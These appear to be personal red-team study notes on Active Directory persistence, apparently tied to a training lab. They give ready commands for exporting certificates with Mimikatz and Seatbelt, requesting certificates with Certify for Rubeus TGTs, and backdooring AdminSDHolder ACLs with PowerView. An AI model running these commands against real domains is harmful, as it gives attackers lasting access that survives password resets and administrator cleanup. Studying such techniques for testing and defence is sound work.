

## certificate services 
if there is CA in the domain you can:

enum for existing cert
```bash 
seatbelt.exe Certificates # export password is mimikatz
mimikatz crypto::certificates /export # /systemstore:local_machine 
```
or request a new one
```bash 
Certify.exe request /template:User /ca:DC19.forest.lab\forest-DC19-CA
Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:Machine /machine 
```
then use rebeus to request a TGT, even if the password changed the cert will still vaild.

# privilages persistance 
AdminSDHold is a DACL template for the protected objects. SDProp is a process that copy the ACL from `CN=AdminSDHolder,CN=System,...` every ~60 minutes. so the user will get these permitions back even if the administrator removed you 
```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights All
```

# LAPS
[[skove/notes/windows arch/active directory/LAPS#persistance]]